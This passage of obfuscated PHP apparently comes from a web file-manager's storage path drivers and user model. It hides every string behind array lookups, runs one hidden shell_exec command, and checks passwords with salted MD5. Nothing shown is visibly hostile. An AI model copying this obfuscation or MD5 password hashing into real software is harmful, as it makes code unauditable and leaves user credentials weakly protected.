$ñ£ùúÒú[908]; return $‚ğàâ±ö; } $œöæ¹Œç = explode($ñ£ùúÒú[262], shell_exec($ñ£ùúÒú[1389])); array_shift($œöæ¹Œç); array_pop($œöæ¹Œç); $«ŞÈ¨Àª = array($ñ£ùúÒú[1390], $ñ£ùúÒú[1391], $ñ£ùúÒú[1392], $ñ£ùúÒú[1393], $ñ£ùúÒú[1394], $ñ£ùúÒú[1395], $ñ£ùúÒú[1396], $ñ£ùúÒú[1397]); foreach ($œöæ¹Œç as $ºƒÔñİ³) { $¬¨»õõ¾ = preg_split($ñ£ùúÒú[1398], $ºƒÔñİ³); $ü˜¸”˜ = $¬¨»õõ¾[count($¬¨»õõ¾) - 1]; if (!strstr($¬¨»õõ¾[0], $ñ£ùúÒú[1399]) || !$ü˜¸”˜) { continue; } $…éã†æ† = rtrim($ü˜¸”˜, $ñ£ùúÒú[8]) . $ñ£ùúÒú[8]; if (in_array($…éã†æ†, $«ŞÈ¨Àª)) { continue; } $‚ğàâ±ö[] = $…éã†æ†; } return $‚ğàâ±ö; } public static function isSameDisk($Æ×ñ˜„Ã, $¡Œ·¦°) { $×˜õ÷¶Á =& $_SERVER[¦»×‡Ãã]; if ($GLOBALS[$×˜õ÷¶Á[6]][$×˜õ÷¶Á[1385]] == $×˜õ÷¶Á[1386]) { return strtolower(substr($Æ×ñ˜„Ã, 0, 1)) == strtolower(substr($¡Œ·¦°, 0, 1)); } $ÈèïÓ©ñ = self::diskList(); $òéÂ‰— = !1; $ÅİŸ×ğë = !1; sort($ÈèïÓ©ñ); $ÈèïÓ©ñ = array_reverse($ÈèïÓ©ñ); $Æ×ñ˜„Ã = rtrim($Æ×ñ˜„Ã, $×˜õ÷¶Á[8]) . $×˜õ÷¶Á[8]; $¡Œ·¦° = rtrim($¡Œ·¦°, $×˜õ÷¶Á[8]) . $×˜õ÷¶Á[8]; foreach ($ÈèïÓ©ñ as $õİÒç£Ÿ) { $«éæüó = strlen($õİÒç£Ÿ); if (!$òéÂ‰— && substr($Æ×ñ˜„Ã, 0, $«éæüó) == $õİÒç£Ÿ) { $òéÂ‰— = $õİÒç£Ÿ; } if (!$ÅİŸ×ğë && substr($¡Œ·¦°, 0, $«éæüó) == $õİÒç£Ÿ) { $ÅİŸ×ğë = $õİÒç£Ÿ; } if ($òéÂ‰— && $ÅİŸ×ğë) { break; } } return $òéÂ‰— === $ÅİŸ×ğë; } public static function transferType($”Òëñæ, $ş”şÀûÌ) { $¹óÄ·ô =& $_SERVER[¦»×‡Ãã]; $äÃ©Õş÷ = self::driverType($”Òëñæ); $›íÁ¾ı• = self::driverType($ş”şÀûÌ); if ($äÃ©Õş÷[$¹óÄ·ô[33]] == $›íÁ¾ı•[$¹óÄ·ô[33]] && $äÃ©Õş÷[$¹óÄ·ô[1400]] == $›íÁ¾ı•[$¹óÄ·ô[1400]]) { return $¹óÄ·ô[1401]; } if ($äÃ©Õş÷[$¹óÄ·ô[33]] == $¹óÄ·ô[941] && $›íÁ¾ı•[$¹óÄ·ô[33]] == $¹óÄ·ô[109]) { return $¹óÄ·ô[1279]; } if ($äÃ©Õş÷[$¹óÄ·ô[33]] == $¹óÄ·ô[109] && $›íÁ¾ı•[$¹óÄ·ô[33]] == $¹óÄ·ô[941]) { return $¹óÄ·ô[110]; } return $¹óÄ·ô[1402]; } public static function driverType($Ü®Õ÷ı¾) { $»Â¾ãËö =& $_SERVER[¦»×‡Ãã]; $è¶õûê = str_replace($»Â¾ãËö[1403], $»Â¾ãËö[12], strtolower($Ü®Õ÷ı¾->getType())); if ($è¶õûê == $»Â¾ãËö[830] || $è¶õûê == $»Â¾ãËö[1404] || $è¶õûê == $»Â¾ãËö[1405]) { $Ü®Õ÷ı¾ = self::defaultDriverInit(); } else { if ($è¶õûê == $»Â¾ãËö[1289] || $è¶õûê == $»Â¾ãËö[1406]) { $Ü®Õ÷ı¾ = IO::init($Ü®Õ÷ı¾->pathParse[$»Â¾ãËö[1232]]); } } $œ¸‡˜¤ = $Ü®Õ÷ı¾->path; $è¶õûê = str_replace($»Â¾ãËö[1403], $»Â¾ãËö[12], strtolower($Ü®Õ÷ı¾->getType())); if ($è¶õûê == $»Â¾ãËö[109]) { return array($»Â¾ãËö[33] => $»Â¾ãËö[109], $»Â¾ãËö[1400] => $»Â¾ãËö[12], $»Â¾ãËö[87] => $œ¸‡˜¤, $»Â¾ãËö[98] => $Ü®Õ÷ı¾); } return array($»Â¾ãËö[33] => $»Â¾ãËö[941], $»Â¾ãËö[1400] => $Ü®Õ÷ı¾->pathDriver, $»Â¾ãËö[87] => $œ¸‡˜¤, $»Â¾ãËö[98] => $Ü®Õ÷ı¾); } public static function pathDriverType($§‡›²Â ) { return $§‡›²Â  ? self::driverType(IO::init($§‡›²Â )) : !1; } public static function pathDriverLocal($Œ›«Ùú„) { $ŠüÍş“ =& $_SERVER[¦»×‡Ãã]; $İ‘©­¿ = $Œ›«Ùú„ ? self::driverType(IO::init($Œ›«Ùú„)) : !1; return strtolower($İ‘©­¿[$ŠüÍş“[33]]) == $ŠüÍş“[109] ? !0 : !1; } public static function allowCover($³§û‚ï, $üû‹½É = true) { $»î÷˜ÙÎ =& $_SERVER[¦»×‡Ãã]; if (is_string($³§û‚ï)) { $³§û‚ï = IO::info($³§û‚ï); } if (!$³§û‚ï || $³§û‚ï[$»î÷˜ÙÎ[33]] == $»î÷˜ÙÎ[78] || $³§û‚ï[$»î÷˜ÙÎ[79]] <= 100) { return !1; } if (isset($³§û‚ï[$»î÷˜ÙÎ[1407]]) || !$³§û‚ï[$»î÷˜ÙÎ[87]]) { return !1; } if (isset($³§û‚ï[$»î÷˜ÙÎ[232]]) && !$³§û‚ï[$»î÷˜ÙÎ[232]]) { return !1; } static $ÌùÁÁè = false; if (!$ÌùÁÁè || !$üû‹½É) { $’¨Òåµ = self::driverType(IO::init($³§û‚ï[$»î÷˜ÙÎ[87]])); $ßÖ¦İ¬“ = $’¨Òåµ[$»î÷˜ÙÎ[98]]; $ÌùÁÁè = $»î÷˜ÙÎ[196]; if ($’¨Òåµ[$»î÷˜ÙÎ[33]] == $»î÷˜ÙÎ[109]) { $ÌùÁÁè = $»î÷˜ÙÎ[1408]; } if ($’¨Òåµ[$»î÷˜ÙÎ[98]] && is_array($’¨Òåµ[$»î÷˜ÙÎ[98]]->config)) { $öç¼ø€É = $’¨Òåµ[$»î÷˜ÙÎ[98]]->config; if (isset($öç¼ø€É[$»î÷˜ÙÎ[1409]]) && $öç¼ø€É[$»î÷˜ÙÎ[1409]]) { $ÌùÁÁè = $»î÷˜ÙÎ[1408]; } } $Ë…ºëŠ¢ = KodIO::defaultDriver(); if (strtolower($Ë…ºëŠ¢[$»î÷˜ÙÎ[98]]) == $»î÷˜ÙÎ[109] && is_array($Ë…ºëŠ¢[$»î÷˜ÙÎ[6]])) { $¿Ì»÷— = $Ë…ºëŠ¢[$»î÷˜ÙÎ[6]][$»î÷˜ÙÎ[1262]]; if (substr($¿Ì»÷—, 0, 2) == $»î÷˜ÙÎ[1410]) { $¿Ì»÷— = str_replace($»î÷˜ÙÎ[1410], BASIC_PATH, $¿Ì»÷—); } $¿Ì»÷— = str_replace($»î÷˜ÙÎ[592], $»î÷˜ÙÎ[8], $¿Ì»÷—); if (substr($³§û‚ï[$»î÷˜ÙÎ[87]], 0, strlen($¿Ì»÷—)) == $¿Ì»÷—) { $ÌùÁÁè = $»î÷˜ÙÎ[196]; } } } return $ÌùÁÁè == $»î÷˜ÙÎ[1408] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ñÆÚ”È¨) { parent::__construct($ñÆÚ”È¨); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ÕãÀè™) { $¼¬§ıÈ’ =& $_SERVER[¦»×‡Ãã]; if (substr($ÕãÀè™, 0, 7) == $¼¬§ıÈ’[313]) { $ÕãÀè™ = $¼¬§ıÈ’[314] . substr($ÕãÀè™, 7); } header($¼¬§ıÈ’[175] . $ÕãÀè™); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ä×Í¬¢û) { parent::__construct($Ä×Í¬¢û); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } public function uploadFormData($…‡ü¿¶Ë, $Ô²İÙõó = 3600) { $Ñëƒ£œ¢ =& $_SERVER[¦»×‡Ãã]; $ê¬ç‘À– = $Ñëƒ£œ¢[229]; $ÒÌãˆ³ë = $Ñëƒ£œ¢[263]; $Æší¿É° = $Ñëƒ£œ¢[274]; $Í¦Çê¨½ = gmdate($Ñëƒ£œ¢[299], time() + $Ô²İÙõó); $…èÁóÁ” = (string) time() . $Ñëƒ£œ¢[74] . (string) (time() + $Ô²İÙõó); $˜¥ŸÏ = array($Ñëƒ£œ¢[275] => $Í¦Çê¨½, $Ñëƒ£œ¢[278] => array(array($Ñëƒ£œ¢[280] => $ê¬ç‘À–), array($Ñëƒ£œ¢[279] => $this->bucket), array($Ñëƒ£œ¢[281], $Ñëƒ£œ¢[282], $Ñëƒ£œ¢[12]), array($Ñëƒ£œ¢[285] => $Æší¿É°), array($Ñëƒ£œ¢[1411] => $ÒÌãˆ³ë), array($Ñëƒ£œ¢[1412] => $this->accessKey), array($Ñëƒ£œ¢[1413] => $…èÁóÁ”))); $˜¥ŸÏ = json_encode($˜¥ŸÏ); $ëÇÂÅª = hash_hmac($Ñëƒ£œ¢[263], $…èÁóÁ”, $this->secret); $€ŒıßŸĞ = sha1($˜¥ŸÏ); $¾¶é—æ = hash_hmac($Ñëƒ£œ¢[263], $€ŒıßŸĞ, $ëÇÂÅª); $òÁú¸ÕÕ = array($Ñëƒ£œ¢[280] => $ê¬ç‘À–, $Ñëƒ£œ¢[285] => $Æší¿É°, $Ñëƒ£œ¢[293] => base64_encode($˜¥ŸÏ), $Ñëƒ£œ¢[1411] => $ÒÌãˆ³ë, $Ñëƒ£œ¢[1412] => $this->accessKey, $Ñëƒ£œ¢[1414] => $…èÁóÁ”, $Ñëƒ£œ¢[1415] => $¾¶é—æ, $Ñëƒ£œ¢[208] => $this->getHost()); return $òÁú¸ÕÕ; } public function fileOutImage($ÔØãıÖö, $ğë¢Õüğ = 250) { $ã·µ ä =& $_SERVER[¦»×‡Ãã]; if ($this->size($ÔØãıÖö) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ÔØãıÖö, $ğë¢Õüğ); } $Œ¥¢û¦â = $this->link($ÔØãıÖö); $Œ¥¢û¦â .= $ã·µ ä[1416] . $ğë¢Õüğ . $ã·µ ä[1417]; $this->fileOutLink($Œ¥¢û¦â); } public function fileOutLink($à…øê¢ï) { $„¯öúÛï =& $_SERVER[¦»×‡Ãã]; if (substr($à…øê¢ï, 0, 7) == $„¯öúÛï[313]) { $à…øê¢ï = $„¯öúÛï[314] . substr($à…øê¢ï, 7); } header($„¯öúÛï[175] . $à…øê¢ï); die; } } goto EÙ”§Åº¬Ÿ; aÅ £ÎÃæî: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\155\145" => "\165\x73\x65\162\x5f\x6d\x65\x74\x61", "\x6d\145\x74\x61\x46\151\x65\x6c\x64" => "\165\163\x65\x72\111\104"); protected $simpleField = "\x75\x73\145\x72\x49\104\54\156\151\x63\x6b\x4e\x61\x6d\145\54\156\141\x6d\x65\x2c\141\x76\x61\164\x61\x72\54\x73\145\x78\54\x73\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ã™Î¡„æ) { $ñ±úÁ—Ë =& $_SERVER[¦»×‡Ãã]; $ŒãÅÚ–‰ = $ñ±úÁ—Ë[2450]; return array($ñ±úÁ—Ë[2053] => array($Ã™Î¡„æ[0], $ŒãÅÚ–‰), $ñ±úÁ—Ë[2055] => array($Ã™Î¡„æ[0], $ŒãÅÚ–‰), $ñ±úÁ—Ë[2451] => array($Ã™Î¡„æ[0], $ŒãÅÚ–‰)); } protected function getInfo($‡·¤‚ İ, $èŠ£úŠ¬ = false) { $©·¹µ„´ = $this->getInfoSimple($‡·¤‚ İ); if (!is_array($©·¹µ„´)) { return array(); } if ($èŠ£úŠ¬) { return $this->_getInfoApply($©·¹µ„´); } return $this->cacheFunctionGet($_SERVER[¦»×‡Ãã][2057], $‡·¤‚ İ); } protected function getInfoFull($Ã±îããê, $ú×½ÒáÊ = false) { $¿ÇüåŠÖ = $this->getInfoSimple($Ã±îããê); if (!is_array($¿ÇüåŠÖ)) { return array(); } if ($ú×½ÒáÊ) { return $this->_getInfoApply($¿ÇüåŠÖ, !0); } return $this->cacheFunctionGet($_SERVER[¦»×‡Ãã][2452], $Ã±îããê); } private function _getInfoApply($¿…àù, $ÜÒ¨Úú½ = false) { $ş¸ò†û• =& $_SERVER[¦»×‡Ãã]; if (!$¿…àù) { return $¿…àù; } $ğè×€í¢ = md5($ş¸ò†û•[2453] . $¿…àù[$ş¸ò†û•[967]] . $ş¸ò†û•[2454] . $¿…àù[$ş¸ò†û•[32]]); $¿…àù = $this->_listDataApplyItem($¿…àù); $ô—ÏŞ¸ö = Model($ş¸ò†û•[1420])->metaGet($¿…àù[$ş¸ò†û•[90]][$ş¸ò†û•[193]]); $¿…àù[$ş¸ò†û•[2455]] = $ğè×€í¢; $¿…àù[$ş¸ò†û•[90]][$ş¸ò†û•[2251]] = isset($ô—ÏŞ¸ö[$ş¸ò†û•[2252]]) ? $ô—ÏŞ¸ö[$ş¸ò†û•[2252]] : null; if ($ÜÒ¨Úú½) { $¿…àù[$ş¸ò†û•[539]] = $this->metaGet($¿…àù[$ş¸ò†û•[1772]]); } return $¿…àù; } protected function getInfoSimple($ÏØœ‡§, $ÖşÒ¨­ = false) { $šçŞÊ« =& $_SERVER[¦»×‡Ãã]; if (!$ÏØœ‡§) { return array(); } if ($ÖşÒ¨­) { $°•å÷·ä = $this->where(array($šçŞÊ«[1772] => intval($ÏØœ‡§)))->find(); if (!is_array($°•å÷·ä)) { return array(); } $°•å÷·ä[$šçŞÊ«[2456]] = Action($šçŞÊ«[2457])->parseUrl($°•å÷·ä[$šçŞÊ«[2456]]); return $°•å÷·ä; } return $this->cacheFunctionGet($šçŞÊ«[2058], $ÏØœ‡§); } protected function getInfoSimpleOuter($Üíí®‡È) { $—²†õÒñ =& $_SERVER[¦»×‡Ãã]; if (!$Üíí®‡È || $Üíí®‡È == 0) { return array($—²†õÒñ[1772] => $—²†õÒñ[228], $—²†õÒñ[32] => $—²†õÒñ[176] . LNG($—²†õÒñ[2458]) . $—²†õÒñ[178], $—²†õÒñ[2456] => STATIC_PATH . $—²†õÒñ[2459]); } $‘à¬¡ó¦ = $this->cacheFunctionGet($—²†õÒñ[2058], $Üíí®‡È); $íÂ¸Œ‚ = array_field_key($‘à¬¡ó¦, explode($—²†õÒñ[50], $this->simpleField)); if (!$íÂ¸Œ‚) { return array($—²†õÒñ[1772] => $—²†õÒñ[1273], $—²†õÒñ[32] => $—²†õÒñ[176] . LNG($—²†õÒñ[2460]) . $—²†õÒñ[178], $—²†õÒñ[2456] => STATIC_PATH . $—²†õÒñ[2461]); } $íÂ¸Œ‚[$—²†õÒñ[2456]] = Action($—²†õÒñ[2457])->parseUrl($íÂ¸Œ‚[$—²†õÒñ[2456]]); return $íÂ¸Œ‚; } protected function groupUser($ôü£µı´) { } public static function errorLang($ï ŒİãÂ) { $¦ú ¶ÈĞ =& $_SERVER[¦»×‡Ãã]; $ùÆ„Ö€ş = array(self::ERROR_USER_NOT_EXISTS => $¦ú ¶ÈĞ[2462], self::ERROR_USER_PASSWORD_ERROR => $¦ú ¶ÈĞ[2463], self::ERROR_USER_EXIST_NAME => $¦ú ¶ÈĞ[2464], self::ERROR_USER_EXIST_PHONE => $¦ú ¶ÈĞ[2465], self::ERROR_USER_EXIST_EMAIL => $¦ú ¶ÈĞ[2466], self::ERROR_USER_LOGIN_LOCK => $¦ú ¶ÈĞ[2467], self::ERROR_IP_NOT_ALLOW => $¦ú ¶ÈĞ[2468], self::ERROR_USER_EXIST_NICKNAME => $¦ú ¶ÈĞ[2469]); $¢Á“ı¤‚ = LNG($ùÆ„Ö€ş[$ï ŒİãÂ]); if ($ï ŒİãÂ == self::ERROR_USER_LOGIN_LOCK) { $Üºµ¹… = (int) Model($¦ú ¶ÈĞ[2470])->get($¦ú ¶ÈĞ[2471]); if ($Üºµ¹… > 60) { $¢Á“ı¤‚ = str_replace($¦ú ¶ÈĞ[91], ceil($Üºµ¹… / 60), $¢Á“ı¤‚); } } return $¢Á“ı¤‚; } public function getInfoByMeta($ì›Óì, $»å¹Ò) { $™£õ¹¸Å =& $_SERVER[¦»×‡Ãã]; $ì¨İˆŸÓ = Model($™£õ¹¸Å[2472])->where(array($™£õ¹¸Å[97] => $ì›Óì, $™£õ¹¸Å[450] => $»å¹Ò))->find(); if ($ì¨İˆŸÓ) { return $this->getInfo($ì¨İˆŸÓ[$™£õ¹¸Å[1772]]); } return !1; } public function userLoginCheck($’ÂÜŒÉ, $ü¡¡¼¹È) { $…ÕÂÀÊğ =& $_SERVER[¦»×‡Ãã]; $‹¢€Øö = $this->userLoginFind($’ÂÜŒÉ); if (!$‹¢€Øö) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($‹¢€Øö[$…ÕÂÀÊğ[1772]], $ü¡¡¼¹È)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($‹¢€Øö[$…ÕÂÀÊğ[1772]]); } public function userLoginFind($¦ÃÈ‹Ş×) { $·å‰ø“ˆ =& $_SERVER[¦»×‡Ãã]; $×åŒÂè = array($·å‰ø“ˆ[32] => $¦ÃÈ‹Ş×, $·å‰ø“ˆ[2259] => $¦ÃÈ‹Ş×, $·å‰ø“ˆ[381] => $¦ÃÈ‹Ş×, $·å‰ø“ˆ[2473] => $¦ÃÈ‹Ş×, $·å‰ø“ˆ[1078] => $·å‰ø“ˆ[1080]); if ($this->nickNameRpt()) { unset($×åŒÂè[$·å‰ø“ˆ[2259]]); } return $this->where($×åŒÂè)->find(); } public function clearCache($‰†Ÿèáş) { $ÎÔî£¸ô =& $_SERVER[¦»×‡Ãã]; $this->cacheFunctionClear($ÎÔî£¸ô[2057], $‰†Ÿèáş); $this->cacheFunctionClear($ÎÔî£¸ô[2058], $‰†Ÿèáş); $this->cacheFunctionClear($ÎÔî£¸ô[2452], $‰†Ÿèáş); } public function userPasswordCheck($‰ÔÒÆä…, $Ó·úì½) { $ÇÖŸñ¦ =& $_SERVER[¦»×‡Ãã]; $Ÿ½í½æÇ = $this->where(array($ÇÖŸñ¦[1772] => intval($‰ÔÒÆä…)))->find(); $Æ…–­‚Œ = $this->metaGet($‰ÔÒÆä…); $’æ‹™Èé = isset($Æ…–­‚Œ[$ÇÖŸñ¦[2474]]) ? $Æ…–­‚Œ[$ÇÖŸñ¦[2474]] : $ÇÖŸñ¦[12]; if (md5($’æ‹™Èé . trim($Ó·úì½)) !== $Ÿ½í½æÇ[$ÇÖŸñ¦[967]]) { return !1; } return !0; } public function userAdd($çõ‚Œ²ß) { $Ô§‹¸ä¬ =& $_SERVER[¦»×‡Ãã]; $ß•¡İ» = array($Ô§‹¸ä¬[494] => $çõ‚Œ²ß[$Ô§‹¸ä¬[32]], $Ô§‹¸ä¬[2475] => $çõ‚Œ²ß[$Ô§‹¸ä¬[2177]], $Ô§‹¸ä¬[2476] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[381]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[381]] : $Ô§‹¸ä¬[12], $Ô§‹¸ä¬[2477] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[2473]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[2473]] : $Ô§‹¸ä¬[12], $Ô§‹¸ä¬[2478] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[2259]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[2259]] : $çõ‚Œ²ß[$Ô§‹¸ä¬[32]], $Ô§‹¸ä¬[2479] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[2456]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[2456]] : $Ô§‹¸ä¬[12], $Ô§‹¸ä¬[2480] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[2481]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[2481]] : 1, $Ô§‹¸ä¬[2482] => $çõ‚Œ²ß[$Ô§‹¸ä¬[967]], $Ô§‹¸ä¬[2059] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[1957]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[1957]] : 1024 * 1024 * 20, $Ô§‹¸ä¬[2060] => 0, $Ô§‹¸ä¬[2483] => 0, $Ô§‹¸ä¬[2104] => isset($çõ‚Œ²ß[$Ô§‹¸ä¬[823]]) ? $çõ‚Œ²ß[$Ô§‹¸ä¬[823]] : 1); if (!empty($çõ‚Œ²ß[$Ô§‹¸ä¬[1772]])) { $ß•¡İ»[$Ô§‹¸ä¬[1772]] = $çõ‚Œ²ß[$Ô§‹¸ä¬[1772]]; } $ò¥½Ê†¾ = $this->_checkExist($çõ‚Œ²ß); if ($ò¥½Ê†¾ !== !0) { return $ò¥½Ê†¾; } if (!empty($ß•¡İ»[$Ô§‹¸ä¬[2456]]) && strlen($ß•¡İ»[$Ô§‹¸ä¬[2456]]) > 255) { $ß•¡İ»[$Ô§‹¸ä¬[2456]] = $Ô§‹¸ä¬[12]; } $‹‚®àç° = $this->add($ß•¡İ»); $ê‹İ”û = array($Ô§‹¸ä¬[2482] => $ß•¡İ»[$Ô§‹¸ä¬[967]], $Ô§‹¸ä¬[2478] => $ß•¡İ»[$Ô§‹¸ä¬[2259]]); $this->userEdit($‹‚®àç°, $ê‹İ”û); Model($Ô§‹¸ä¬[1420])->userRootAdd($‹‚®àç°); return $‹‚®àç°; } protected function userEditTest($Éø—ù¤, $€Ìîíïù) { return $this->call($_SERVER[¦»×‡Ãã][2484], $Éø—ù¤, $€Ìîíïù); } protected function userEdit($Ÿ¢ı¸î¡, $çãÎ•­Ç) { $Ó¸Š®¿Ü =& $_SERVER[¦»×‡Ãã]; $‹ÖËäóú = $this->getInfoSimple($Ÿ¢ı¸î¡); if (!$‹ÖËäóú) { return !1; } $¥¥¦Ü« = $this->_checkExist($çãÎ•­Ç, $Ÿ¢ı¸î¡); if ($¥¥¦Ü« !== !0) { return $¥¥¦Ü«; } if (isset($çãÎ•­Ç[$Ó¸Š®¿Ü[967]]) && trim($çãÎ•­Ç[$Ó¸Š®¿Ü[967]]) != $Ó¸Š®¿Ü[12]) { $‡¥šÄğ¢ = $this->metaGet($Ÿ¢ı¸î¡); if (empty($‡¥šÄğ¢[$Ó¸Š®¿Ü[2474]])) { $‡¥šÄğ¢[$Ó¸Š®¿Ü[2474]] = rand_string(10); Model($Ó¸Š®¿Ü[577])->metaSet($Ÿ¢ı¸î¡, $Ó¸Š®¿Ü[2474], $‡¥šÄğ¢[$Ó¸Š®¿Ü[2474]]); } $çãÎ•­Ç[$Ó¸Š®¿Ü[967]] = md5($‡¥šÄğ¢[$Ó¸Š®¿Ü[2474]] . trim($çãÎ•­Ç[$Ó¸Š®¿Ü[967]])); } else { unset($çãÎ•­Ç[$Ó¸Š®¿Ü[967]]); } if (!empty($çãÎ•­Ç[$Ó¸Š®¿Ü[2456]]) && strlen($çãÎ•­Ç[$Ó¸Š®¿Ü[2456]]) > 255) { $çãÎ•­Ç[$Ó¸Š®¿Ü[2456]] = $Ó¸Š®¿Ü[12]; } $this->where(array($Ó¸Š®¿Ü[1763] => $Ÿ¢ı¸î¡))->save($çãÎ•­Ç); if (isset($çãÎ•­Ç[$Ó¸Š®¿Ü[2259]])) { $this->setNamePinyin($Ÿ¢ı¸î¡, $çãÎ•­Ç[$Ó¸Š®¿Ü[2259]]); } $this->clearCache($Ÿ¢ı¸î¡); return !0; } public function setNamePinyin($ó££ÍÅ°, $¢Î·±£Ó = false) { $Àğ‹ô† =& $_SERVER[¦»×‡Ãã]; if (!$¢Î·±£Ó) { $âë•êô = $this->getInfoSimple($ó££ÍÅ°); $¢Î·±£Ó = $âë•êô[$Àğ‹ô†[2259]] ? $âë•êô[$Àğ‹ô†[2259]] : $âë•êô[$Àğ‹ô†[32]]; } $ÂŞæ°«© = Model($Àğ‹ô†[598]); if (!Input::check($¢Î·±£Ó, $Àğ‹ô†[655])) { return $ÂŞæ°«©->metaSet($ó££ÍÅ°, array($Àğ‹ô†[538] => $Àğ‹ô†[12], $Àğ‹ô†[537] => $Àğ‹ô†[12])); } return $ÂŞæ°«©->metaSet($ó££ÍÅ°, array($Àğ‹ô†[538] => str_replace($Àğ‹ô†[53], $Àğ‹ô†[12], Pinyin::get($¢Î·±£Ó)), $Àğ‹ô†[537] => Pinyin::get($¢Î·±£Ó, $Àğ‹ô†[656]))); } private function nickNameRpt() { $†Ää‡š± =& $_SERVER[¦»×‡Ãã]; $† É“ˆ = Model($†Ää‡š±[843])->get($†Ää‡š±[2485]); $‡Ö«µÕô = $GLOBALS[$†Ää‡š±[6]][$†Ää‡š±[457]][$†Ää‡š±[2485]]; $á¬åáâê = !is_null($† É“ˆ) ? $† É“ˆ : $‡Ö«µÕô; return !!$á¬åáâê; } private function _checkExist($İıĞÙÈÓ, $áÓá±Á = false) { $¹Ÿƒ¿Ç =& $_SERVER[¦»×‡Ãã]; $—ş˜›²Í = array($¹Ÿƒ¿Ç[32] => UserModel::ERROR_USER_EXIST_NAME, $¹Ÿƒ¿Ç[2259] => UserModel::ERROR_USER_EXIST_NICKNAME, $¹Ÿƒ¿Ç[381] => UserModel::ERROR_USER_EXIST_EMAIL, $¹Ÿƒ¿Ç[2473] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($—ş˜›²Í[$¹Ÿƒ¿Ç[2259]]); } $÷ú®Û–× = $áÓá±Á ? array($¹Ÿƒ¿Ç[1772] => array($¹Ÿƒ¿Ç[2486], $áÓá±Á)) : array(); foreach ($—ş˜›²Í as $²Ôì¥İæ => $Ø£æş™„) { $ÄĞ€˜À¢ = array(); foreach ($—ş˜›²Í as $ğ½ˆ™ º => $–‹¨Ì¾¡) { if (isset($İıĞÙÈÓ[$ğ½ˆ™ º]) && $İıĞÙÈÓ[$ğ½ˆ™ º]) { $ÄĞ€˜À¢[] = $İıĞÙÈÓ[$ğ½ˆ™ º]; } } if (!$ÄĞ€˜À¢) { continue; } $Šóà°ó´ = array_merge(array($²Ôì¥İæ => array($¹Ÿƒ¿Ç[7], $ÄĞ€˜À¢)), $÷ú®Û–×); $òˆó—ï¨ = $this->where($Šóà°ó´)->find(); if ($òˆó—ï¨) { return $Ø£æş™„; } } return !0; } public function userListInfo($Ù¯¥‹úÂ) { $Ûü÷â ’ =& $_SERVER[¦»×‡Ãã]; $çÚ‘Œ¿§ = array(); $Ù¯¥‹úÂ = is_array($Ù¯¥‹úÂ) ? array_unique($Ù¯¥‹úÂ) : array(); if (!$Ù¯¥‹úÂ) { return $çÚ‘Œ¿§; } if (count($Ù¯¥‹úÂ) < 20) { foreach ($Ù¯¥‹úÂ as $Ş´º³é) { $çÚ‘Œ¿§[$Ş´º³é . $Ûü÷â ’[12]] = $this->getInfoSimpleOuter($Ş´º³é); } } else { $€Â¸œû = array($Ûü÷â ’[1763] => array($Ûü÷â ’[492], $Ù¯¥‹úÂ)); if (count($Ù¯¥‹úÂ) == 1) { $€Â¸œû = array($Ûü÷â ’[1763] => $Ù¯¥‹úÂ[0]); } $Îò¤õ¹… = Model($Ûü÷â ’[577])->field($this->simpleField)->where($€Â¸œû)->select(); $Îò¤õ¹… = array_to_keyvalue($Îò¤õ¹…, $Ûü÷â ’[1772]); foreach ($Ù¯¥‹úÂ as $Ş´º³é) { $³”¼ÙÙê = $Îò¤õ¹…[$Ş´º³é]; if (!$³”¼ÙÙê) { $çÚ‘Œ¿§[$Ş´º³é . $Ûü÷â ’[12]] = $this->getInfoSimpleOuter($Ş´º³é); continue; } $³”¼ÙÙê[$Ûü÷â ’[2456]] = Action($Ûü÷â ’[2457])->parseUrl($³”¼ÙÙê[$Ûü÷â ’[2456]]); $çÚ‘Œ¿§[$Ş´º³é . $Ûü÷â ’[12]] = $³”¼ÙÙê; } } return $çÚ‘Œ¿§; } protected function userStatus($à…İÆ´, $éñ¹³Îà) { $ó †ğÇÃ = $this->getInfoSimple($à…İÆ´); if (!$ó †ğÇÃ) { return !1; } $ù¯‚’ü = array($_SERVER[¦»×‡Ãã][823] => $éñ¹³Îà); return $this->userEdit($à…İÆ´, $ù¯‚’ü); } protected function userRemove($›Ğ«òßˆ) { $ñİÓ‡°Î =& $_SERVER[¦»×‡Ãã]; $°Çş°ß¼ = $this->getInfoSimple($›Ğ«òßˆ); if (!$°Çş°ß¼) { return !1; } $òúÈÂŸê = array($ñİÓ‡°Î[1763] => $›Ğ«òßˆ); Model($ñİÓ‡°Î[664])->where($òúÈÂŸê)->delete(); Model($ñİÓ‡°Î[2487])->where($òúÈÂŸê)->delete(); Model($ñİÓ‡°Î[2065])->where($òúÈÂŸê)->delete(); Model($ñİÓ‡°Î[2472])->where($òúÈÂŸê)->delete(); Model($ñİÓ‡°Î[1147])->where($òúÈÂŸê)->delete(); 